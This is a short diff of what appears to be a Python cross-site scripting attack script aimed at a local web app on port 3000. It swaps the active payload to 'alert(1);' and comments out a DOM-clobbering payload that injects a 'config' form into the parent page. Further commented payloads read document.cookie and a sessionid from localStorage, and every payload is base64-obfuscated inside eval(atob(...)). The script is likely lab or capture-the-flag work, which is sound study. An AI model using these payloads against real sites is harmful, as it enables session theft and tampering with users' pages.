@@ -8,7 +8,7 @@ base = "http://localhost:3000/"
 # name = "embed"
 name = "script"
 
-# payload = "alert(1);"
+payload = "alert(1);"
 # payload = "alert(document.cookie);"
 
 # payload = "localStorage.getItem('sessionid');"
@@ -26,13 +26,13 @@ name = "script"
 #
 # 
 # 
-payload='''
-const form = document.createElement('form');
-form.id = 'config';
-form.innerHTML = '<input name="debug" />';
-setTimeout(() => {
-  parent.document.body.appendChild(form);
-}, 3000);'''
+# payload='''
+# const form = document.createElement('form');
+# form.id = 'config';
+# form.innerHTML = '<input name="debug" />';
+# setTimeout(() => {
+#   parent.document.body.appendChild(form);
+# }, 3000);'''
 
 
 payload = 'eval(atob("'+b64encode(payload.encode()).decode()+'"));'
